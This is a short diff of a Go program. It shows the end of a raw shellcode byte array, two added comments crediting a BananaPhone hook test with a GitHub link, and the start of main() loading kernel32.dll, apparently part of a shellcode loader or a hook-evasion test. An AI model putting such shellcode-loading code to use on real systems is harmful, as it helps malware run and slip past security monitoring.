@@ -30,6 +30,8 @@ var shellcode = []byte{
 	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
 	0xd7,
 }
+//hook test from bananaphone
+//https://github.com/C-Sto/BananaPhone/tree/master/example/testhook
 
 func main() {
 	kernel32DLL := windows.NewLazySystemDLL("kernel32.dll")
